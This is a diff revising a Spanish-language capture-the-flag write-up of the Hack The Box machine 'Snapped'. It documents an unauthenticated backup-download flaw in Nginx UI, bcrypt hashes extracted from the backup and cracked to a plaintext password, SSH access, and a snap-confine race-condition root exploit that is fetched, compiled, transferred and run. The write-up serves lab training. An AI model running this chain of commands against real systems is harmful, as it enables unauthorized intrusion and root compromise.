@@ -1,61 +1,64 @@
-# HTB — Snapped 🟥 Hard
+# 🔬 HTB Snapped — Writeup
  
-> **Plataforma:** Hack The Box  
-> **SO:** Linux (Ubuntu 24.04 LTS)  
-> **Dificultad:** Hard  
-> **CVEs:** CVE-2026-27944 · CVE-2026-3888  
-> **Autor del writeup:** *CipherWall-Mz*
+![HackTheBox](https://img.shields.io/badge/Platform-HackTheBox-9fef00?style=for-the-badge&logo=hackthebox&logoColor=black)
+![Dificultad](https://img.shields.io/badge/Dificultad-Hard-red?style=for-the-badge)
+![OS](https://img.shields.io/badge/OS-Linux-informational?style=for-the-badge&logo=linux&logoColor=white)
+![Estado](https://img.shields.io/badge/Estado-Pwned-success?style=for-the-badge)
+ 
+> ⚠️ **Aviso legal:** Este writeup es únicamente con fines educativos y fue realizado en un entorno controlado de HackTheBox. Aplicar estas técnicas fuera de entornos autorizados es ilegal.
  
 ---
  
-## Índice
+## 📋 Tabla de contenidos
  
-1. [Reconocimiento](#1-reconocimiento)
-2. [Enumeración Web](#2-enumeración-web)
-3. [CVE-2026-27944 — Backup sin autenticación](#3-cve-2026-27944--backup-sin-autenticación)
-4. [Cracking de hashes bcrypt](#4-cracking-de-hashes-bcrypt)
-5. [Acceso inicial — SSH](#5-acceso-inicial--ssh)
-6. [Escalada de privilegios — CVE-2026-3888](#6-escalada-de-privilegios--cve-2026-3888)
-7. [Root](#7-root)
+- [Resumen](#-resumen)
+- [Reconocimiento](#-reconocimiento)
+- [Enumeración Web](#-enumeración-web)
+- [CVE-2026-27944 — Backup sin autenticación](#-cve-2026-27944--backup-sin-autenticación)
+- [Cracking de hashes bcrypt](#-cracking-de-hashes-bcrypt)
+- [Acceso SSH — Flag de usuario](#-acceso-ssh--flag-de-usuario)
+- [Escalada de privilegios — CVE-2026-3888](#-escalada-de-privilegios--cve-2026-3888)
+- [Conceptos clave](#-conceptos-clave)
+- [Cadena de ataque](#-cadena-de-ataque)
 ---
  
-## 1. Reconocimiento
+## 🗺 Resumen
  
-### Escaneo de puertos
+| Campo      | Detalle                                              |
+|------------|------------------------------------------------------|
+| Nombre     | Snapped                                              |
+| Plataforma | HackTheBox                                           |
+| OS         | Linux (Ubuntu 24.04 LTS)                             |
+| Dificultad | Hard                                                 |
+| User flag  | ✅                                                   |
+| Root flag  | ✅                                                   |
+| CVEs       | CVE-2026-27944 (Nginx UI backup) · CVE-2026-3888 (snapd LPE) |
+ 
+---
+ 
+## 🔍 Reconocimiento
  
 ```bash
 nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.x.x -oG allPorts
-```
- 
-```
-PORT   STATE SERVICE REASON
-22/tcp open  ssh     syn-ack ttl 63
-80/tcp open  http    syn-ack ttl 63
-```
- 
-Solo dos puertos abiertos: **SSH (22)** y **HTTP (80)**.
- 
-### Escaneo de versiones y scripts
- 
-```bash
 nmap -sCV -p22,80 10.129.x.x -oN targeted
 ```
  
-```
-22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
-80/tcp open  http  nginx 1.24.0 (Ubuntu)
-              └─ Redirect → http://snapped.htb/
-```
+**Puertos relevantes:**
  
-Añadimos el dominio al `/etc/hosts`:
+| Puerto | Servicio | Detalle                          |
+|--------|----------|----------------------------------|
+| 22     | SSH      | OpenSSH 9.6p1 Ubuntu             |
+| 80     | HTTP     | nginx 1.24.0 → redirect a `snapped.htb` |
+ 
+Añadimos los dominios al `/etc/hosts`:
  
 ```bash
-echo "10.129.x.x snapped.htb" >> /etc/hosts
+echo "10.129.x.x snapped.htb admin.snapped.htb" >> /etc/hosts
 ```
  
 ---
  
-## 2. Enumeración Web
+## 🌐 Enumeración Web
  
 ### Fuzzing de subdominios (Virtual Host)
  
@@ -70,16 +73,12 @@ ffuf -u http://10.129.x.x \
 admin   [Status: 200, Size: 1407]
 ```
  
-Añadimos `admin.snapped.htb` al `/etc/hosts` y visitamos el panel.
- 
-### Identificación de versión
+### Identificación de versión de Nginx UI
  
 ```bash
-# Extraemos el JS principal
 curl http://admin.snapped.htb/ -s | grep -P '.js\b'
 # → ./assets/index-DoHxQupa.js
  
-# Buscamos el archivo de versión
 curl http://admin.snapped.htb/assets/index-DoHxQupa.js -s | grep -oP 'version[-\w]*\.js'
 # → version-BWPlJ0ga.js
  
@@ -87,7 +86,7 @@ curl http://admin.snapped.htb/assets/version-BWPlJ0ga.js
 # → const t="2.3.2"
 ```
  
-> **Hallazgo:** Panel **Nginx UI v2.3.2** en `admin.snapped.htb`
+> **Hallazgo:** Panel **Nginx UI v2.3.2** corriendo en `admin.snapped.htb`
  
 ### Fuzzing de endpoints API
  
@@ -98,17 +97,19 @@ feroxbuster -u http://admin.snapped.htb/api
 | Endpoint | Estado | Nota |
 |---|---|---|
 | `/api/install` | 200 | `{"lock":true,"timeout":false}` — ya instalado |
-| `/api/backup` | **200** | **¡Devuelve ZIP sin autenticación!** |
+| `/api/backup` | **200** | **¡Devuelve ZIP cifrado sin autenticación!** |
 | `/api/licenses` | 200 | JSON de licencias de dependencias |
-| `/api/user`, `/api/users`, etc. | 403 | Requieren autenticación |
+| `/api/user`, `/api/users`, `/api/sites`, etc. | 403 | Requieren autenticación |
  
-> ⚠️ **Hallazgo crítico:** `/api/backup` es accesible sin auth y devuelve un archivo binario cifrado.
+> ⚠️ **Hallazgo crítico:** `/api/backup` es accesible sin auth y la clave de descifrado viaja en la propia cabecera HTTP.
  
 ---
  
-## 3. CVE-2026-27944 — Backup sin autenticación
+## 🔓 CVE-2026-27944 — Backup sin autenticación
  
-### Descarga del backup
+**Descripción:** Nginx UI expone el endpoint `/api/backup` sin autenticación y filtra la clave AES-256 y el IV en la cabecera `X-Backup-Security`, permitiendo a cualquier atacante descargar y descifrar el backup completo de la aplicación.
+ 
+### Descarga y extracción de la clave
  
 ```bash
 curl http://admin.snapped.htb/api/backup -v -o backup.bin 2>&1 | grep X-Backup-Security
@@ -118,10 +119,13 @@ curl http://admin.snapped.htb/api/backup -v -o backup.bin 2>&1 | grep X-Backup-S
 X-Backup-Security: US8nZUXhWdKZ7J1mbE1TProx9oT5H9HzSmaqng5wD0c=:E9sRPUh0wUOolJp7ijmLSg==
 ```
  
-La cabecera expone la clave AES-256 y el IV en Base64 separados por `:`:
+La cabecera expone dos valores Base64 separados por `:`:
  
-- **Parte 1** (32 bytes) → Clave AES-256  
-- **Parte 2** (16 bytes) → IV (Initialization Vector)
+| Parte | Longitud | Rol |
+|---|---|---|
+| Primer valor | 32 bytes | Clave AES-256 |
+| Segundo valor | 16 bytes | IV (Initialization Vector) |
+ 
 ### Descifrado con el PoC
  
 ```bash
@@ -132,12 +136,10 @@ python3 poc.py --target http://admin.snapped.htb/ --decrypt
 [*] Main archive contains: ['hash_info.txt', 'nginx-ui.zip', 'nginx.zip']
 [*] Decrypting nginx-ui.zip...  → Extracted 2 files to backup_extracted/nginx-ui
 [*] Decrypting nginx.zip...     → Extracted 22 files to backup_extracted/nginx
- 
-nginx-ui_hash : 239501dc783b4a8f13ed06ceba1799a5a7506573e6a94f2946dcb0e76c931f84
-version       : 2.3.2
+version: 2.3.2
 ```
  
-### Extracción de hashes de la base de datos
+### Extracción de hashes desde la base de datos
  
 ```bash
 cd backup_extracted/nginx-ui
@@ -147,60 +149,48 @@ sqlite> .headers on
 sqlite> select name, password from users;
 ```
  
-```
-admin     │ $2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm
-jonathan  │ $2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq
-```
- 
-Ambos son hashes **bcrypt** (`$2a$10$`).
+| Usuario | Hash bcrypt |
+|---|---|
+| `admin` | `$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm` |
+| `jonathan` | `$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq` |
  
 ---
  
-## 4. Cracking de hashes bcrypt
+## 🔑 Cracking de hashes bcrypt
  
 ```bash
-hashcat -m 3200 hashes.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
+hashcat -m 3200 hashes.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
 ```
  
-```
-$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq : linkinpark
-```
+**Resultado:**
  
 | Usuario | Contraseña | Estado |
 |---|---|---|
 | `jonathan` | `linkinpark` | ✅ Crackeado |
 | `admin` | — | ❌ No crackeado |
  
-> **Nota:** El modo 3200 de hashcat corresponde a bcrypt `$2*$` (Blowfish). Es intencionalmente lento; las contraseñas comunes del diccionario se craquean, las complejas probablemente no.
- 
 ---
  
-## 5. Acceso inicial — SSH
- 
-### Validación de credenciales
+## 🚩 Acceso SSH — Flag de usuario
  
 ```bash
+# Validación de credenciales
 netexec ssh snapped.htb -u jonathan -p linkinpark
 # [+] jonathan:linkinpark  Linux - Shell access!
-```
  
-### Login
- 
-```bash
+# Login
 ssh jonathan@snapped.htb
 # Password: linkinpark
-```
  
-```bash
 jonathan@snapped:~$ cat user.txt
-03c0ba5************************
+090aa3c5************************
 ```
  
 ---
  
-## 6. Escalada de privilegios — CVE-2026-3888
+## ⬆️ Escalada de privilegios — CVE-2026-3888
  
-### Enumeración inicial
+### 1. Enumeración del sistema
  
 ```bash
 sudo -l
@@ -209,38 +199,23 @@ sudo -l
 id
 # uid=1000(jonathan) gid=1000(jonathan) groups=1000(jonathan)
  
-cat /etc/passwd | grep 'sh$'
-# root y jonathan únicamente
-```
- 
-Sin sudo, sin grupos especiales (docker, lxd, disk). Exploramos otras vías.
- 
-### Versión del kernel y snapd
- 
-```bash
-uname -a
-# Linux snapped 6.17.0-19-generic — kernel de Marzo 2026
- 
 snap version
 # snap    2.63.1+24.04
 # snapd   2.63.1+24.04
 ```
  
-### Descubrimiento clave: tmpfiles con limpieza agresiva
+Sin sudo, sin grupos especiales. Miramos la configuración de `systemd-tmpfiles`:
  
 ```bash
-systemctl list-timers systemd-tmpfiles-clean
-# Runs every minute
- 
 cat /usr/lib/tmpfiles.d/tmp.conf
-# D /tmp 1777 root root 4m   ← ¡4 minutos! (el default es 30 días)
+# D /tmp 1777 root root 4m   ← ¡4 minutos! (el default de Ubuntu es 30 días)
 ```
  
-> 🔑 **Observación crítica:** El umbral de limpieza de `/tmp` se redujo de 30 días a **4 minutos**, haciendo CVE-2026-3888 explotable en minutos.
+> 🔑 **Observación crítica:** El umbral de limpieza de `/tmp` fue reducido de 30 días a **4 minutos**, haciendo CVE-2026-3888 explotable en minutos.
  
-### CVE-2026-3888 — snap-confine / systemd-tmpfiles LPE
+### 2. CVE-2026-3888 — snap-confine / systemd-tmpfiles LPE
  
-**Descripción:** Escalada de privilegios local en `snapd` (< 2.73) en todas las versiones LTS de Ubuntu. Permite obtener root recreando el directorio privado `/tmp/.snap` de snap cuando `systemd-tmpfiles` lo limpia automáticamente.
+**Descripción:** Escalada de privilegios local en `snapd` (< 2.73) en todas las versiones LTS de Ubuntu. Permite obtener root explotando una race condition entre `snap-confine` (SUID root) y `systemd-tmpfiles` al recrear `/tmp/.snap`.
  
 **Componentes involucrados:**
  
@@ -252,137 +227,144 @@ cat /usr/lib/tmpfiles.d/tmp.conf
 **Flujo del ataque:**
  
 1. `snap-confine` usa `/tmp/.snap/` como área de staging para bind-mounts
-2. `systemd-tmpfiles` elimina `/tmp/.snap` cuando supera el umbral (4m aquí)
-3. Al desaparecer, `snap-confine` lo recrea desde cero en el siguiente lanzamiento
-4. El atacante gana la race condition intercambiando atómicamente (`rename()`) el directorio legítimo por uno envenenado — después de que `snap-confine` pasa su validación pero antes del bind-mount
-5. `snap-confine` (corriendo como root) bind-monta los archivos envenenados del atacante
-6. La carga útil reemplaza `ld-linux-x86-64.so.2` — cuando el SUID `snap-confine` lo carga, ejecuta el código del atacante como root
-### Compilación del exploit
+2. `systemd-tmpfiles` elimina `/tmp/.snap` al superar el umbral de 4 minutos
+3. En el siguiente lanzamiento snap, `snap-confine` lo recrea desde cero
+4. El atacante intercambia atómicamente (`rename()`) el directorio legítimo por uno envenenado — tras la validación pero antes del bind-mount
+5. `snap-confine` (corriendo como root) bind-monta los archivos del atacante
+6. La carga útil reemplaza `ld-linux-x86-64.so.2` — cuando el SUID `snap-confine` lo carga, ejecuta código del atacante como **root**
+### 3. Compilación y transferencia del exploit
  
 ```bash
 # Clonar el PoC
 git clone https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE
 cd CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE
  
-# Compilar el exploit principal (variante SUID para Ubuntu 24.04)
+# Compilar variante SUID (Ubuntu 24.04)
 gcc -O2 -static -o exploit exploit_suid.c
- 
-# Compilar el shared object malicioso (reemplaza el dynamic linker)
 gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c
-```
  
-### Transferencia al objetivo
- 
-```bash
+# Transferir al objetivo
 sshpass -p linkinpark scp exploit librootshell.so jonathan@snapped.htb:/tmp/
 ```
  
-### Ejecución
+### 4. Ejecución
  
 ```bash
 jonathan@snapped:/tmp$ chmod +x exploit librootshell.so
 jonathan@snapped:/tmp$ ./exploit librootshell.so
 ```
  
-**Flujo del exploit (ejecución exitosa):**
- 
 ```
 ================================================================
     CVE-2026-3888 — snap-confine / systemd-tmpfiles SUID LPE
 ================================================================
-[*] Payload: /tmp/librootshell.so (9184 bytes)
- 
-[Phase 1] Entering Firefox sandbox...
-[+] Inner shell PID: 5365
- 
-[Phase 2] Waiting for .snap deletion...
-[+] .snap deleted.
- 
-[Phase 3] Destroying cached mount namespace...
-[+] Namespace destroyed.
- 
-[Phase 4] Setting up and running the race...
-[*]   285 entries copied to exchange directory
-[*]   Starting race...
-[!]   TRIGGER — swapping directories...
-[+]   SWAP DONE — race won!
- 
-[Phase 5] Injecting payload into poisoned namespace...
-[+]   ld-linux owned by uid 1000 (attacker). Race confirmed.
-[*]   Overwriting ld-linux-x86-64.so.2...
-[+]   Payload injected.
- 
-[Phase 6] Triggering root via SUID snap-confine...
-[*]   Exit status: 0
- 
+[Phase 1] Entering Firefox sandbox...     [+] Inner shell PID: 5365
+[Phase 2] Waiting for .snap deletion...   [+] .snap deleted.
+[Phase 3] Destroying cached namespace...  [+] Namespace destroyed.
+[Phase 4] Setting up and running race...
+          [!] TRIGGER — swapping directories...
+          [+] SWAP DONE — race won!
+[Phase 5] Injecting payload...            [+] Payload injected.
+[Phase 6] Triggering root via SUID...     [*] Exit status: 0
 [Phase 7] Verifying...
-[+] SUID root bash: /var/snap/firefox/common/bash (mode 4755)
+          [+] SUID root bash: /var/snap/firefox/common/bash (mode 4755)
  
 ================================================================
   ROOT SHELL: /var/snap/firefox/common/bash -p
 ================================================================
 ```
  
-> **Nota:** Si el exploit falla con `permission denied` en Phase 4, puede ser AppArmor interfiriendo. En ese caso usa la flag `-s` para saltar la espera de Phase 2 y reintentar: `./exploit librootshell.so -s`
+> **Nota:** Si el exploit falla en Phase 4 con `permission denied`, es AppArmor interfiriendo. Usa la flag `-s` para saltar la espera y reintentar: `./exploit librootshell.so -s`
  
 ---
  
-## 7. Root
+## 📚 Conceptos clave
  
+### CVE-2026-27944 — Nginx UI backup endpoint sin auth
+El endpoint `/api/backup` no requiere token de sesión y filtra la clave AES-256 + IV en la cabecera `X-Backup-Security`. Cualquier actor sin credenciales puede descargar y descifrar el backup completo, obteniendo acceso a la base de datos SQLite con hashes de contraseñas.
+ 
+### CVE-2026-3888 — Race condition en snap-confine
+`snap-confine` es un binario SUID que prepara namespaces para las apps snap usando `/tmp/.snap` como área temporal. Cuando `systemd-tmpfiles` limpia ese directorio, `snap-confine` lo recrea sin suficientes garantías atómicas, permitiendo al atacante reemplazar el directorio con uno envenenado. La carga útil sustituye al dynamic linker (`ld-linux-x86-64.so.2`), que al ser cargado por el binario SUID root ejecuta código arbitrario como root.
+ 
+### bcrypt — Por qué el cracking es lento
+```
+Modo hashcat 3200 = bcrypt $2*$ (Blowfish)
+```
+bcrypt incorpora un factor de coste (`$2a$10$` → 2^10 = 1024 iteraciones). Esto hace que cada intento sea ~1000x más lento que MD5. Las contraseñas del top de rockyou.txt se craquean; las complejas probablemente no.
+ 
+### systemd-tmpfiles — Parámetro de edad
 ```bash
-bash-5.1# whoami
-root
+# Formato en tmp.conf
+D /tmp 1777 root root <EDAD>
  
-bash-5.1# cat /root/root.txt
-<flag>
+# Valores
+4m   → 4 minutos  (esta máquina — explotable rápidamente)
+30d  → 30 días    (Ubuntu stock — espera real en producción)
 ```
+ 
+### Hashcat — modos más usados
+ 
+| Modo | Hash |
+|---|---|
+| `-m 0` | MD5 |
+| `-m 100` | SHA1 |
+| `-m 1800` | SHA-512 (shadow) |
+| `-m 3200` | bcrypt |
+| `-m 22000` | WPA2 PMKID |
  
 ---
  
-## Resumen de la cadena de ataque
+## 🔗 Cadena de ataque
  
 ```
-Reconocimiento
-      │
-      ▼
-admin.snapped.htb  (Nginx UI 2.3.2)
-      │
-      ▼
-CVE-2026-27944: /api/backup sin auth
-→ AES key+IV en cabecera X-Backup-Security
-→ Descifrado del backup → database.db
+[Reconocimiento]
+nmap → puertos 22, 80
+ffuf → subdominio admin.snapped.htb
+        │
+        ▼
+[Nginx UI 2.3.2]
+feroxbuster → /api/backup sin auth
+CVE-2026-27944: AES key+IV en X-Backup-Security
+→ Descifrado del backup → database.db (SQLite)
 → Hash bcrypt de jonathan
-      │
-      ▼
-hashcat -m 3200 → jonathan:linkinpark
-      │
-      ▼
-SSH como jonathan → user.txt
-      │
-      ▼
-snapd 2.63.1 + tmpfiles 4m = CVE-2026-3888
-→ Race condition en snap-confine (SUID)
-→ Poison del dynamic linker ld-linux-x86-64.so.2
-      │
-      ▼
-root shell → root.txt
+        │
+        ▼
+[hashcat -m 3200]
+jonathan : linkinpark
+        │
+        ▼
+[SSH] → user.txt ✅
+        │
+        ▼
+[snapd 2.63.1 + tmpfiles 4m]
+CVE-2026-3888: race condition snap-confine (SUID)
+→ Poison de ld-linux-x86-64.so.2
+→ SUID bash en /var/snap/firefox/common/bash
+        │
+        ▼
+[/var/snap/firefox/common/bash -p] → root ✅
+        │
+        ▼
+[root.txt] ✅
 ```
  
 ---
  
-## Herramientas utilizadas
+## 🛠 Herramientas utilizadas
  
-| Herramienta | Propósito |
+| Herramienta | Uso |
 |---|---|
 | `nmap` | Reconocimiento de puertos y servicios |
-| `ffuf` | Fuzzing de subdominios |
-| `feroxbuster` | Fuzzing de directorios y endpoints API |
+| `ffuf` | Fuzzing de subdominios (Virtual Host) |
+| `feroxbuster` | Fuzzing de endpoints API |
 | `curl` | Interacción manual con la API |
 | `sqlite3` | Inspección de la base de datos del backup |
 | `hashcat` (modo 3200) | Cracking de hashes bcrypt |
 | `netexec` | Validación de credenciales SSH |
 | `gcc` | Compilación del exploit CVE-2026-3888 |
+| `sshpass` / `scp` | Transferencia del exploit al objetivo |
  
 ---
  
-*WriteUp por [CipherWall-Mz] — Hack The Box*
+*Writeup realizado con fines educativos en HackTheBox.*
+
